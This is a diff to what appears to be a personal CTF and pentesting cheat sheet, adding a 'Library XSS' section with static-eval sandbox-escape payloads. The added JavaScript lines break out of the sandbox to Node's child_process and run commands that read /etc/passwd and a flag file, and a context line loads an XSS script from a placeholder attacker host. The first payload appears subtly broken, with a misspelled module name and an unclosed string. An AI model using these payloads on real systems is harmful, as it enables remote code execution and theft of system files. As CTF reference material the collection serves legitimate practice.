@@ -247,6 +247,15 @@ XSS :
 <script src=http://OUR_IP:OUR_PORT/script.js></script>
 ```
 
+**Library XSS**  
+static-eval sandbox : 
+[licenciaparahackear_static_eval_escape](https://licenciaparahackear.github.io/posts/static-eval-sandbox-escape-original-writeup/)
+```javascript
+(function({e}){return e.constructor})({e:''.sub})('process.mainModule.require(\"child__process\").exec(\"cat /etc/passwd\")
+(function myTag(y){return ''[!y?'__proto__':'constructor'][y]})('constructor')('throw new Error(global.process.mainModule.constructor._load(\"child_process\").execSync(\"cat /app/flagn2VN4\").toString())')()
+```
+
+
 
 ### SQL Injection    
 Its time to SQLI Suuuuuuuuuuuuuuuuuu !!!!!!!!!!!  
